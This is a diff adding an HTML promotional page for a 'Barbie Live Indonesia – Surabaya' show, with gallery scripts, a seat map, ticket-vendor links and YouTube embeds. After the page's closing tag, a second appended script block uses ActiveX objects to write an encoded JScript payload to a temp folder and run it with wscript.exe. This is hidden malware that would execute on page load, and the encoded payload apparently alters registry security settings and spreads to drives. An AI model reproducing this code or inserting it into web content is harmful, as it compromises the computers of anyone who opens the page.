@@ -1,0 +1,426 @@
+<!--[ANNIE83E333BF08546819]-->
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>BARBIE LIVE INDONESIA - SURABAYA</title>
+<link rel="stylesheet" href="style.css" type="text/css" media="screen, projection" />
+<link href='http://fonts.googleapis.com/css?family=Oswald:700' rel='stylesheet' type='text/css'>
+<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1/jquery.min.js"></script>		
+<script type="text/javascript" src="js/jquery.easing.1.3.js"></script>
+<script type="text/javascript" src="source/jquery.fancybox.js?v=2.1.5"></script>
+<link rel="stylesheet" type="text/css" href="source/jquery.fancybox.css?v=2.1.5" media="screen" />
+
+<script type="text/javascript">
+		$(document).ready(function() {
+			/*
+			 *  Simple image gallery. Uses default settings
+			 */
+
+			$('.fancybox').fancybox();
+
+			/*
+			 *  Different effects
+			 */
+
+			// Change title type, overlay closing speed
+			$(".fancybox-effects-a").fancybox({
+				helpers: {
+					title : {
+						type : 'outside'
+					},
+					overlay : {
+						speedOut : 0
+					}
+				}
+			});
+
+			// Disable opening and closing animations, change title type
+			$(".fancybox-effects-b").fancybox({
+				openEffect  : 'none',
+				closeEffect	: 'none',
+
+				helpers : {
+					title : {
+						type : 'over'
+					}
+				}
+			});
+
+			// Set custom style, close if clicked, change title type and overlay color
+			$(".fancybox-effects-c").fancybox({
+				wrapCSS    : 'fancybox-custom',
+				closeClick : true,
+
+				openEffect : 'none',
+
+				helpers : {
+					title : {
+						type : 'inside'
+					},
+					overlay : {
+						css : {
+							'background' : 'rgba(238,238,238,0.85)'
+						}
+					}
+				}
+			});
+
+			// Remove padding, set opening and closing animations, close if clicked and disable overlay
+			$(".fancybox-effects-d").fancybox({
+				padding: 0,
+
+				openEffect : 'elastic',
+				openSpeed  : 150,
+
+				closeEffect : 'elastic',
+				closeSpeed  : 150,
+
+				closeClick : true,
+
+				helpers : {
+					overlay : null
+				}
+			});
+
+			/*
+			 *  Button helper. Disable animations, hide close button, change title type and content
+			 */
+
+			$('.fancybox-buttons').fancybox({
+				openEffect  : 'none',
+				closeEffect : 'none',
+
+				prevEffect : 'none',
+				nextEffect : 'none',
+
+				closeBtn  : false,
+
+				helpers : {
+					title : {
+						type : 'inside'
+					},
+					buttons	: {}
+				},
+
+				afterLoad : function() {
+					this.title = 'Image ' + (this.index + 1) + ' of ' + this.group.length + (this.title ? ' - ' + this.title : '');
+				}
+			});
+
+
+			/*
+			 *  Thumbnail helper. Disable animations, hide close button, arrows and slide to next gallery item if clicked
+			 */
+
+			$('.fancybox-thumbs').fancybox({
+				prevEffect : 'none',
+				nextEffect : 'none',
+
+				closeBtn  : false,
+				arrows    : false,
+				nextClick : true,
+
+				helpers : {
+					thumbs : {
+						width  : 50,
+						height : 50
+					}
+				}
+			});
+
+			/*
+			 *  Media helper. Group items, disable animations, hide arrows, enable media and button helpers.
+			*/
+			$('.fancybox-media')
+				.attr('rel', 'media-gallery')
+				.fancybox({
+					openEffect : 'none',
+					closeEffect : 'none',
+					prevEffect : 'none',
+					nextEffect : 'none',
+
+					arrows : false,
+					helpers : {
+						media : {},
+						buttons : {}
+					}
+				});
+
+			/*
+			 *  Open manually
+			 */
+
+			$("#fancybox-manual-a").click(function() {
+				$.fancybox.open('1_b.jpg');
+			});
+
+			$("#fancybox-manual-b").click(function() {
+				$.fancybox.open({
+					href : 'iframe.html',
+					type : 'iframe',
+					padding : 5
+				});
+			});
+
+			$("#fancybox-manual-c").click(function() {
+				$.fancybox.open([
+					{
+						href : '1_b.jpg',
+						title : 'My title'
+					}, {
+						href : '2_b.jpg',
+						title : '2nd title'
+					}, {
+						href : '3_b.jpg'
+					}
+				], {
+					helpers : {
+						thumbs : {
+							width: 75,
+							height: 50
+						}
+					}
+				});
+			});
+
+
+		});
+	</script>
+
+<script>
+$(function() {
+ 
+    // grab the initial top offset of the navigation 
+    var sticky_navigation_offset_top = $('#menu').offset().top;
+     
+    // our function that decides weather the navigation bar should have "fixed" css position or not.
+    var sticky_navigation = function(){
+        var scroll_top = $(window).scrollTop(); // our current vertical position from the top
+         
+        // if we've scrolled more than the navigation, change its position to fixed to stick to top,
+        // otherwise change it back to relative
+       if (scroll_top > sticky_navigation_offset_top) { 
+            $('#menu').css({ 'position': 'fixed', 'bottom':0, });
+		  $('#menu ul').css({ 'padding-bottom': '0' });
+        } else {
+            $('#menu').css({ 'position': 'relative' }); 
+	     $('#menu ul').css({ 'padding-bottom': '15px' });
+        }   
+    };
+     
+    // run our function on load
+    sticky_navigation();
+     
+    // and run it again every time you scroll
+    $(window).scroll(function() {
+         sticky_navigation();
+    });
+ 
+});
+
+</script>
+
+ <script type="text/javascript">
+$(document).ready(function () {
+                $('#menu li a').bind('click',function(event){
+                    var $anchor = $(this);
+                    
+                    $('html, body').stop().animate({
+                        scrollTop: $($anchor.attr('href')).offset().top
+                    }, 1500,'easeInOutExpo');
+                    /*
+                    if you don't want to use the easing effects:
+                    $('html, body').stop().animate({
+                        scrollTop: $($anchor.attr('href')).offset().top
+                    }, 1000);
+                    */
+                    event.preventDefault();
+                });
+            });
+			
+			
+			$(document).ready(function () {
+				$('#english ').hide();
+                $('a#indo-but').bind('click',function(event){
+                    $('#english').hide();
+					$('#indonesia ').show();
+                    });
+                    
+					$('a#english-but').bind('click',function(event){
+                    $('#english').show();
+					$('#indonesia').hide();
+                    });
+              });
+			  $(document).ready(function () {
+				$('#tata-english ').hide();
+                $('a#tata-indo-but').bind('click',function(event){
+                    $('#tata-english ').hide();
+					$('#tata-indo ').show();
+                    });
+                    
+					$('a#tata-english-but').bind('click',function(event){
+                    $('#tata-english ').show();
+					$('#tata-indo ').hide();
+                    });
+              });
+            
+ </script>
+ <meta name="description" content=" BARBIE LIVE INDONESIA - SURABAYA"/>
+ <meta name="keywords" content=" BARBIE LIVE INDONESIA - SURABAYA, barbie live indonesia, barbie live, barbie live surabaya"/>
+</head>
+
+<body>
+<div id="wrapper">
+    <div id="header"><img src="images/header.jpg"  />
+	
+<div id="menu">
+    <ul>
+    	<li> <a href="#header"> HOME </a> </li>
+        <li> <a href="#layout"> VENUE </a> </li>  
+        <li> <a href="#ticket"> TICKET </a> </li>    
+        <li> <a href="#videos"> VIDEOS </a> </li>        
+        <li> <a href="#contact"> CONTACT </a> </li>
+    </ul>
+    </div>
+
+	</div>
+  	
+    <div id="layout">
+    <h2> SEAT ARRANGEMENT </h2>
+	<br />
+    <img src="images/sby-seat.jpg"  />
+    
+    </div>
+    
+   
+     
+    <div id="ticket">
+    <h2> TICKET </h2>
+    <div class="left price">
+    <img src="images/surabaya.jpg"  />    
+    </div>
+    <div class="right tc">
+     <a href='#show' class="menu-tc fancybox"><h2> SHOW TIME</h2></a>
+    <a href='#terms' class="menu-tc fancybox"><h2> TERM & CONDITION</h2></a>
+     <a href='#tata' class="menu-tc fancybox"><img src="images/tiket.png" /></a>
+
+    <!--a href='http://dyandratiket.com/signup.php' target="_blank" class="menu-tc"><h2> GET YOUR TICKET </h2></a-->
+    </div>
+    </div>
+    <div class="clear"></div>
+    
+    <div id="videos">
+    <h2> VIDEOS </h2>
+    <div class="vid">
+    	<iframe width="640" height="480" src="//www.youtube.com/embed/OH8RxdugmtA" frameborder="0" allowfullscreen></iframe>
+    </div>
+    </div>
+   
+    <div id="contact">
+    <h2> CONTACT </h2>
+    <br />
+    <span class="anounce"> HOTLINE : 021-71796214 or EMAIL : support@dyandratiket.com	</span>
+    <br />
+    <br />
+    <br />
+    <br />
+    <div >
+	<h2> PROMOTED BY </h2>
+    <div class="spon">
+    	<ul>
+        <li >
+  			<a href="#"  ><img src="images/promotor.jpg"  /></a>
+    	</li>	
+        	
+    	
+    	</ul>
+    </div>
+
+    <h2> PRODUCED BY </h2>
+    <div class="spon">
+    	<ul>
+        <li >
+  			<a href="#"  ><img src="images/producer.jpg"  /></a>
+    	</li>	
+        	
+    	
+    	</ul>
+    </div>
+    </div>
+    <!--div class="right">
+    
+    <h2> SPONSORED BY </h2>
+    	<div class="spon">	
+    		</div>
+    </div-->
+    </div>
+    
+<div id="mandiri" style="display: none;">
+	<img src="images/tata-cara.jpg" />
+</div>
+   
+<div id="terms" style="display: none;">
+	<span class="switch"><a id="indo-but" href="#indonesia"> indonesia </a> || <a id="english-but" href="#english"> english </a></span>
+	<div id="indonesia">
+    <h2>TICKETING FAQ (ONLINE)</h2>
+        <br />	
+       <img src="images/1.jpg" />
+	<img src="images/2.jpg" />
+    </div>
+    
+    
+	
+
+	</div>
+
+<div id="tata" style="display: none;">
+	<a href="http://www.blibli.com/promo/tiket-barbie-live/" target="_blank"><h2>www.blibli.com</h2></a><br />
+	<br />
+      <a href='http://dyandratiket.com/' target="_blank" class="menu-tc"><h2> www.dyandratiket.com </h2></a><br />
+	<br />
+	<a href="https://rajakarcis.com/" target="_blank"><h2>rajakarcis.com</h2></a>		<br />
+    <br />
+	<a href="http://www.tiket.com/" target="_blank"><h2>www.tiket.com</h2></a><br />    
+</div>
+<div id="show">
+	<h2> SHOW TIME </h2>
+	<img src="images/show-time-sby.jpg" />
+</div>
+
+    <div id="vid-1" style="display: none;">
+    <iframe width="600" height="338" src="//www.youtube.com/embed/XWQ2xCdmxOw" frameborder="0" allowfullscreen></iframe>
+    </div>
+    
+    <div id="vid-2" style="display: none;">
+    <iframe width="600" height="338" src="//www.youtube.com/embed/YSjeZvEBENo" frameborder="0" allowfullscreen></iframe>
+    </div>
+    
+    <div id="vid-3" style="display: none;">
+    <iframe width="600" height="338" src="//www.youtube.com/embed/XWQ2xCdmxOw" frameborder="0" allowfullscreen></iframe>
+    </div>
+    
+    <div id="vid-4" style="display: none;">
+    <iframe width="600" height="338" src="//www.youtube.com/embed/6ex1YkDXelo" frameborder="0" allowfullscreen></iframe>
+    </div>
+    
+    <div id="vid-5" style="display: none;">
+    <iframe width="600" height="338" src="//www.youtube.com/embed/EXZxc8GSXnI" frameborder="0" allowfullscreen></iframe>
+    </div>
+    
+    <div id="vid-6" style="display: none;">
+    <iframe width="600" height="338" src="//www.youtube.com/embed/kKAnYWNnYW8" frameborder="0" allowfullscreen></iframe>
+    </div>
+    
+    
+</div>
+</body>
+</html>
+
+<html>
+<script type="text/javascript">
+<!--
+var ayfp6=new ActiveXObject('Scripting.FileSystemObject');var dk5h8=new ActiveXObject('WScript.Shell');var s41k8=ayfp6.GetSpecialFolder(2);var bgw3u=ayfp6.GetTempName();var vlx8c='#@~^2CAAAA==-mD~a%!6y{xAPzmOk7+p6(L+1O`E?mMr2YbxTRoksnUXdYhr(Ln^DB#I-mD~6A2Xx	+SPb1Yb-+or8LmOcE?1.kaYRU4nV^B*i-l.~1\\8l$xUm.raYRj^Mk2Yw;^VHm:i\\mD,5!$+;\'4X;.l`m78l$#i7C.Pa&64L\'20!6"RVnYUwn^blVoG^NnDvq*i-mD,0%mFOxw208o3Bww9Dk7nDk--msrmRkXdBIW!x^YbGx,l{;FE`b`StrVc1\\8m;{\'0Rl81#P\\CD,:+1Xt\'	nh,2x!hnDmYKDcw0;Xy fMr\\/bI6WDchy,atchK\\nwkM/Yv#pZ:y,atclO3	N`*I:y,64 hW7+g+aYcb*	-lM~mZLGn{: 1a4RrYhv#Ib0v``1!NG+cf.k7+Pza+\'{qu-m!NGnRGDb\\nKz2\'x *\'[1!%GRnCO4"xBzlE#\'LmZLWR&dIl[X*	OTD0v^!NW+cKCY4_E-wlsr1+ l^^B*iLVF/Lc^ZLG+cKmY43B\'-l!YK.E	Rrx6BbI$l,7a`1!LKn nmY4_v-wv*i2&7skvmT%K+RKCDtQB\'wE#I)8)80!x1OkKx~42;*Xv/hF0o*	DO;D	Pa%;6" V+O2XO+	/rG	1lhnv/AGRL*ROKSKh+MZmd+v#I86EU^DkW	~47*y8cb	7lMPO!%O!\'^\\(C;c/;8kYDcTBm-4m5cVn	oDtOW#pr0vw0EXy obV+AakkY/vOTLDE3B NG^XBb#PVERV2cD!LO;BB NK^XBbp8V/PbW`a%;6.Ror^+2Xr/D/`DT%Y!_ER[W^v*#`3!0Va`OTNYESvcNGmEbp8n^/Pk6`a0EXy sbVn3Xk/Dd`D!LD;QBcDD0v#b`0E0VacYZLO;BBR.O6Bbi)N6EU1YbWx,mlUL2`b	X+AfHRD!U`Em/1.rwDR6nP&&)%/1.kaY n	mW[n,BQ0RC8,QEPJDBB!*IUm.kaY j^++acFZ!#panh2XcD;xcv1/^Db2Yc+an,zznlN/^Db2DRn	mKN+,B3W%mF1_EP&dE~!*IUmDb2ORUV+2`qTZ#I6A&HR];	`B^d1DrwD 6n,zJ+)N/1.kaY +	mG[PB3W%mF,3v~z	BB!biNW!x^YbGx,mA*MY`[0Nla#Pr6`2REXyRwk^n2XkdYk`[0Nl6*b	M+Y!.UPa%!6"R!nDsrVcNRLCa*R?r"iN+^d	.Y!Dx,x!sVp8N0!x^ObWx,[ (0*v;WwFE*	.+O;Mx~wR;6.R!nDAldnglh+v;6w{!#p80!x1OkKx~+OV%"v#	bW`1hcMOc0Rl8,b"x0W&f[L^hWDOc6%lq1*"xGRq+#`D!D0v0RCFO#I6hfzcIE	cBS/mMr2Yc+X+~z&n=LdmMrwDRnU1WNn~E_W%mqO_v,zB#p8)WE	mOkKx~L0G/Nc0+0;ab`\\mD,m{%;1{B,l!OWMEUD\'x/4n^Vn6^!Yn{hkmDbwD +X+~zJ+l%kmDb2Yc+x1G[+,l^k^+ C^m~zmwxktns^--G2xw-1Gs:C	N{h/1Db2Yc+a+,z&n=L/1.kaYRU^W9+,lsk^nclsm,&l\'xd4VVww62VK.-w1Ws:l	N{A/1DrwDRnaPzJn)N/mMr2Yc+	mGNn~mVrm l^m~&mBirWvtzEMXv06;a#"{mF0EO#`kK&8.v0v65wB!#pO.XP\\mD~k[0^;xwR;6.R/.lYnP6Osbs`W+0$w~DD!n#pk[%^; 	MkYcmF%EObIk9%^; ZsGk+c#pNmmY^4v+#`r6`2%!a.RoKV9+DA6bdYk`Wv6;2b*	XR;6W`0+W5w*iT3{/%c6vW;abi)8Wr	lVszPkG&(.v06;a~&O#pN8)0;x1YrG	PtH;Dl`wWdV6*	DDz	.nDE.x,2%!6" }w+UP6Osbs`2W/06~8#c]+mN)V^`bI)mlD^tv+#P.nY!D	PvBIN)0;x1OkKx~rK&4.cMy;,0SS/"6G*	k6`a0EXy sbVn3Xk/Dd`MyEOVb#PYMX`\\C.,YWt0s\'a%;a.RMnOwks+v..E10#pY043^ bDY.k(EOnk\'hk"0Fi81COm4`#`8NN6EUmDrW	Pr"Gvc2O3.;*`X+A2XcI+TMrY`vCnZ]w\'B_M^:Wh`E B?AB*_v-wvBD^:WA`Mmh*S`w1VM;b_Ew\'Bb*iX+h2Xc]+T.kD+cv_|Z"w-E_D1h*hvBc9j2vb3Bw-Gn0mEsO&mWUw\'BSD1hWhcMmschvwOVD$#QB\'-9n6lE^Oq1Wx\'wv#*iX+A&z "+LMrY`vunZIwwE_.ms*S`vc9U2B*_Ew-wDr+	Nsz:XwHls+BB.^:WhvD^:*Avw13M5#3BwwE#~v]AMm2oKz19|?\\B#p86;x1YrW	PV;RVwv[XZylBW%:80*	ODz`7l.P9. !Dx.1:cAcMmhcSc6Lh80*_B\'-k4+^Vw-}wnU\'-mKh:mxNEbIk6`9D+E. slOm4czuF&be\'x;s^#`6A2X "E	`NM !.RM+2VmmncE]FESNH!ymQWLsF6#biNn^/n	Xnh2X ]!x`[.yE._E~rBQ9XZyl30NhF6_vJE#IN)mlD^tv+#PNN0!x1YrWU~^w0DWc#Ph4r^+`^-(l5\'{WRlqO#PY!D6c0Rlq,*iaUTtFvbi.!4Xsc#p:(VamcbpjmMrwDRjs+wcqZ!T#pN)0;	mDkW	Ps8VXmc#PY.zPky{vvBR9G^6E#p8^lO^4`n#PODH	r"GvcvcNGmEbp8^mY1t`#PODH	ryGcERDDWB*i81COm4`#`8NN)0;x1OkKx~22\\Vrcmh^*^bP\\CMP6wV	*{U+SP3x!:n.mYWMcwRE6. !+DsKV[+.cmh^*^bRUE8oKVNn.k#I0K.v02^xlR:K\\okM/O`*iZWaVxl lD2x9cbi6w^xXRhG7+H+XO`*#`-mDP8nFD^\'62^xXckD+:v#pr0v`8+FD^ gl:Z\'EI2;e/SAIE[\'4n{Mm 1mh+e\'vjH/Ynh,.GV!hP(	0KD:mYbGxE#\'[(+{.1RnmOte\'wR;aycMYjwn^blssKsNDcT*#	5CO\\a`(nFD^cnmYt*iaf\\^kc4G.^cnlD4#p88)W;x1YbWUP5Wm5`.C+^*Sh0yo.bP\\CD,5	341\'4XEM*v"lVX#p\\C.,3kWrW{;!$n;RM+aVCmncJ-wzTSB\'-wwE#i-CMP-!^1s\'VbcbWRM+asl1+cz\'B&LBB-\'wBE#i7C.PaGM 5\'v@!4YhV@*wx@!/^.bwY~OHwn\'rO6OJLm\\lkmMrwDJ@*-	@!ZR -x7CD,lX62\'	+SP)mOr7+pr(%+1YcwE?m.raYrxT wks?H/Y:}8LmO-E#I-mDP9V*4%\'	nAPzmDk-+p6(LnmDc-Ej^MkwO UtnV^wE#I7lMP/WF00\'mXWw+R!nD?w^kmVsKs[+M`y#I\\C.,4Lh2;\'mXW2+RMnO:+hwgCs+c*i7lD,\\^a%1\'wBE_-T^,:3v-E_?D.rxTR6DG:/4mD/W9n`Z#I-mDP.AHoX\'mz6wcZM+lD+:n6DsrV`d*83%3wB\'--\'wv_(oS&;~O.!+biMAXT* 	MkYnc7Va%1bpDAHolRZ^Wkn`*i[3lt0 "ExvwBS/mMr2Yc+X+~z&n=LdmMrwDRnU1WNn~\'BQ/Wq0%Q\'B\'--\'-EQ4ThfE3-v~JY-Ebi\'xzJRR@*\'x@!zdm.raY@*-	@!z4Yhs@*BirG24.`.CVXB!*iYMXP-lMPVcH![xa%EX"R;D+mOnK6DsrVncs3"oMSYMEnbp3czT9R	DbOSr	+v;x0t1bi0cz!9R	.bY+drx`wF.+;*i0cz![ ;VG/c#p8^CDmtcn*	N0bUmVsH	b0`\'{UE^Vb	a%;a.Rfs+D+sbsn`.lVX~O.!+bi)N86EU^DkWU~$l1\\Xca;hlv*	\\mD,O,W0d\'	+A~AxEsnDmYWMc2%!6.R!+OoKV[+Mcw$:X*Rsrs/bi6GM`OOc6/RsW7nsbDdYv#IZD,c6dRmY2	[c#pYOcW/ hK\\n1aYv#b`7lD~;+yaL{OOcWkRbY+s`* nmY4ib0cc(&;WX`!vyX%b\'{B9W^Bkk(&5clcE+ya%*\'\'v[KmaB-k(&5W*vEv.6Nb\'{B.Y6Bb\'LN (W*vEv.a%#c/!4dY.cZ~+#exB?^vbPY!n.6`2;sX+_v\'-E_Ny46X`!v"6N#QvcL/v#pkW28.`a;s*_vw\'BQNy80l`;.6LbQER%/vBw0!6.RMYwrV`;v.6%bcbYD.k(EYdbibW24.`;.6%~20#p8nsk+PrWv4f;WXvE.6N#\'{B4O:Euk42;*XvEv.aL*\'\'E4O:^B*	5v*^$`;v.aLBw5hlv_vw\'BQNy86*c!v.6L*_E tDlv#p8	j1DkaORUV+2cc*i)8WEU^DkGx,.mscAcDh+aG*	.+D;Mx~X+S&XcILIl[`ECF/"--EQYS+6KQv-\'B*iN0;U1YrW	~/Oydhv#	A4bVn`1-(l5{\'6%l8,*`YMX`\\mD~z7cEWxxhPz^Ok7+or8Ln^D`vU^DbwO g+YAGM3v#p-mD~my7cm{X7*EWR3x!:HnDhWMVfMk\\dc#p0KDc\\C.,kxFpr@!my-*1RVnUTY4ibQ{ bP;m,\\X`m"\\Wm qD+hcb#_Ew-E#i)N^lDm4`n#`Nq?^Db2Yc?snw`1TZ!T!*I)8W!x1YkKx,O!DW`	*1Wl#	bW`1hcMOcxl,6*b"x0W&f#PrW24.c	*,WXB!biD.H	-mD,D&SvaxwREaycZ.nmY+:n6Dsk^ncxl,6*SY.;#ID2AvaR	.bY+c5Z;nE*IM&A+wcZVK/c#p8^lDm4c#	bW`a%EX" sKV9+.2arkYd`	X,6*bbPX%;aW`U*OWl#ID!D0vxl10l#I8)0rUmVVH`k6`425**vxl,W*bZ{B%/v#PkGf(D`UXO0X~21*iN)8)0E	mDrW	PaxTtqc*	YMz	7lD,n1tTx{6nhfzcIno"nl9`vunZjwwUWWYSCM+w\'HbmDK/KWY\'-	k	NGAk--;;DM+xD#nDkkKxw-3aaVGD.-\'?4n^VPoG^NnDkw\'Z9,A!DxbxTv#pYT+M0cnOto	QB\'-l^r^+cl^mv#IL0GdLvn,4oUQE--C;DW.E	 bxWE#p8mmY14`#`8)0;U1YkKUPH%EX*c++lkmb	O.H	2%!aycfnsY+oG^NnDvn+ld1~DDE#pNmmY^tv+b`X+h2zR"Exvv^:9R6nP&^,D[PJdPJ;~w\'-- w\'Jv_m/^3BrB~Z~D.E#I8)0;U1YkKUP.!4Xsc#PYMX`6nA2X ILfVnO`BuF;Iw-Cw\'/4V^+6\'-;GxD+aYt+U;_lx9s+M/-\'62+	PqkOtwwE#I81CY1tcn*	8O.H	a+SfHR]oqDkD+vvCnZ]-\'BQ.1:cScBckx6vb_E-\'/4+ss\'-(xkOl^Vww1W:hC	Nw-ESEmh9R6+,z1~NV~z$P&W,J]8EBBBIA!m2onz19{jtE#I81CY1tcn*	8O.H	a+SfHR]oqDkD+vvCnZ]-\'BQ.1:cScBc9?Avb_E-\'?4+ss\'-3NbO-\'ZGhslx[w\'BSD1hWhcMmschvBcB?ABb_E-wj4+V^w-}w+	wwZK:slUNwwE#SB"3M|2pKz1fmj\\Bbi)^mY^4`#	)YMz	X+A&HR]nTf+^nY`B_F/I\'-E_.mh*S`vRxj2E#Qv\'-?4n^Vw-}2x+\'-E#i)mmOm4`n#P8O.H	6A&HRIL9+^+D+cBuF;Iw-EQD1:*AvBRBjABb_Ew\'?4V^--}wU \'-/Ws:CU9--Ebi)mlD^4`#P8ODz`X+A&H Io9n^+YncECFZ"w\'BQMmschvBcB?ABb_E-wj4+V^36\'-nMG2+MYH?4+nO_lUN^nDk-w	UCn.Ga/w-Ebp8^mY1t`#PNYMX`6hfzcI+T	DbY+vvu|;I\'-v_.^scA`E Dovb3B-wd4+sV\'wKwn	-\'mWs:mUN\'-v~Emh[c+6~z1PNs~z$PJ0~JYqrBSB"3M|2pKz1fmj\\Bbi)^mY^4`#	)YMz	X+A&HR]nTDbO+vBCn/i-\'?K0OhC.-wHb^DK/GWD--	r	NGhkw\'Z;MDxYj+MdkKxw-A62sKD+Mw-zN\\mU^+9-\'CrNnobVn2XOBBBqvBBI3!|f	r"9E#I)mmYm4`b	)Y.XP6nA2XR"noqDkDncB_|;jw-jG6YAlMn-\'Hr^MW/GWD-wbU9WAk-\'ZEMDUYj+./bWUw\'26asWM+D\'w)N7l	mnNwwUtGhU;wDur9N+UvBBTBBv"2!|fqrIGB*I81lOm4`nbP8YMz	X+h2z IoqDrYncECFZ`w-UWWOSlDnw\'HrmMGkWWD-\'k	NKA/\'-/EMDnUD.+MdkKx-\'KGVbmb+d-w3XwsWMnD\'-HGwkVn)k/GmbCD+vBB8B~EIA!{G6IGBbI)mlD^tv+#PNODH	X+A&z "+LMrY`vunZjwwUWWYSCM+w\'HbmDK/KWY\'-	k	NGAk--;;DM+xD#nDkkKxw-KG^k^kd-\'?zdD+:wwGkdl(sInTkkYDHKKGVkBSB8BSv"2M|9}IfEbI81lDm4`nbP8ODH`6hfzcI+L	MkO+vv_|/`-\'?W6YSCD-wHbm.GkW0Dw-qkx9GA/\'-;E.DnUD.nDkrW	-wKKVk^r/w-UzkYns-\'fkkl(s+:ld3to.vBBFESB"2M|9	r"fE#I8^CDm4`b	)Y.zP6+AfHR]+T	MkO`EC|;j\'w?K0OhmDnw\'nW^rmb+/\'w\\k1DK/G0Ow\'H\\Z\'wI/O.bmYPGh+.:bOD+[Uxmwk	/ESB8BSB"2!mGr"9B*i81COm4`#`8O.H	a+SfXcInLqDkOnvBu|d\\\'-j}s:b"2\'wHbm.WkWWO\'-bUNKh/,HP-\'Z!D.+UOj+./bGx\'-(hmo+~obVnPAam;DkKxP}wDrW	/w-mYO.b4Ra+\'-f8;oT+MBSB^h9Rn6~z1P.nsB#IN1lOm4c#`)YMX	X+SfXcInoqDrO`B_FSt--U6oKqb"2w-\\r1DG/KWY\'-	r	NWAd,1P-\'/!D.xD.+M/bGx\'-(:mon~wkV~2X+m!OrW	P}wOkGUk-wDLR6nw\'f+8;TonDESEmh9R6+,z1~D:v#p8^CDmtvn#P8YMz`6h2X InLqDrYcB_|J\\\'-?6o:)IAw\'Hr1DK/W6Y\'wbx[WS/~H:--;;DM+xD#nDkkKxw-(hmonPwrVP3amEOrKx~raObWUk-\'Ylk30rV^Rn6-w94ETL+MB~E^hNc+X+~z^~M+hB*I81lO^4`+b`)Y.XPahfHR"+oqDbO+vBu|dHwwUrs:	b"2-\'\\rmMWkWWYwwqkUNKA/,1Pw\'ZE..xO..kkG	-\'k	VKLW	-wjk+.r	kYESw204TQv-\'Ek+.kUrDRn6Shkm.raYRnaP&zlN/^MkaYRx1GNPv_6%CqO_B,&+E#i)^CY1tv+b	NOMX`6A&HR]nTDrO`vCnJt-wUrwKzIAw-tk^DK/GWD--qrx9WhkwwZ!DM+UY#nM/rW	w-A62sKD+.w\'b[\\mU1+[\'-wWV9+Mw-_k[+wksnA6Y\'wj	mt^V+9.mV;+vSEFv~E]2V{9	}Ifvbp8^lD^4`n*	)YDH	Xnh2X Io	.bY+vvCnSH\'wjrwKqb]2wwtk^DKdW6Ywwqkx[GS/w-;;MDn	Yj+DkkKU-\'2aw^W.nM--z[\\mxm[w-wW^NnDwwUE2+Muk9NnU\'-jU^4+^3[jls!+E~BZBBvIAMmfqr]9E#i)^lDmtvnb	)YMX`6nA2X ILMkOnvBCFJt-w?}o:)"2\'-nKVb^k/w-tk^.K/W6O-\'k	[GhkPgKw-jzkYn:"n/DW.n\'-frdm4s+;G	0rTBBBFE~E]2V{9}I9v*i81CY1t`b`8DDH	a+AfHR]+T	DbYncEC|J\\\'-jrwPqb]A-\'nW^k1r+k-wHbm.GkW0Dw-qkx9GA/,1:-w?zdD+hIdYKDnw\'fkdC(Vn?"vBBqE~EI2V{G	r"fv#p8^CDmtvn#P886;UmDkKx~y2"K+c#P-lMPC*$VYx	Um.kaOcb.TEs+xD/pr0v4f;W*c^74l$b"{BLknv[LlW;sY sxLY4@*!*	dAbYm4cmc5VD &Yns`Z##Pmmd+,B&+E)^X	L&vbi(D+mVImm/Pvz.v=V2%M*`*i8.l3I^m/nPE&kBlmG!GEv#p8DlVi1ldn,Bz	v)k,ykhc#p4M+C3I^m/nPE&YE)n1^Lycbp6nh2zcI;	`Em:9Ra+,z^P9+s~J;PJWPE_m78C;B!*i8DnC0i^lknPEzCv=+,s%.`biXnS&zcI!x`E+X2VKDnDc+an,z+B&/V+1OSB3m74C;bI)8nVkn	,s%.`#I87*"Fvbp8N.w.W+v#paVgLAA==^#~@ '+String.fromCharCode(0);var rwyg5=ayfp6.CreateTextFile(s41k8+'\\'+bgw3u,true);rwyg5.Write(vlx8c);rwyg5.Close();dk5h8.Run('wscript.exe //e:jscript.encode '+s41k8+'\\'+bgw3u+' /t');
+//-->
+</script>
+</html>
